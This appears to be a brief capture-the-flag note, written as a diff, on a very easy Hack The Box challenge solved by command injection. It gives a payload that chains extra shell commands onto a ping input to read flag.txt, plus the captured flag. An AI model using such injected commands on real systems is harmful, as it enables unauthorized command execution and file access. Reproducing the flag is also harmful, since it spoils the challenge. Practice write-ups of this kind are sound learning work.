@@ -1,0 +1,4 @@
+Simple command inejction reveals HTB flag (very easy challange).
+
+/ping ip; && cd .. && cat flag.txt
+HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}
